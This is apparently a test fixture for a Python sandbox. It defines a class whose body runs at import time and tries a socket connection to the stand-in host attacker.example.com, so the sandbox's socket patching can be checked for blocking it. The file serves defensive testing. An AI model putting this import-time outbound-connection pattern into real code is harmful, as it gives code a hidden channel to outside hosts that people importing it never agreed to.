# Adversarial fixture 7: nested class with module-level side-effects on import
# The class body executes at import time and attempts a socket connection.
# The sandbox monkey-patches socket.socket and socket.create_connection before
# loading the user module, so the side-effect is blocked.
# Convention: every adversarial module defines run(snapshot, params) -> Any

import socket as _socket

# Module-level side-effect: attempts to connect at import time.
class _Exfiltrator:
    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)

    # Executed at class body definition time:
    _conn_attempt = None
    try:
        _conn_attempt = _socket.create_connection(("attacker.example.com", 443), timeout=1)
    except Exception:
        pass


class _Derived(_Exfiltrator):
    pass


def run(snapshot, params):
    return "side-effect-on-import"
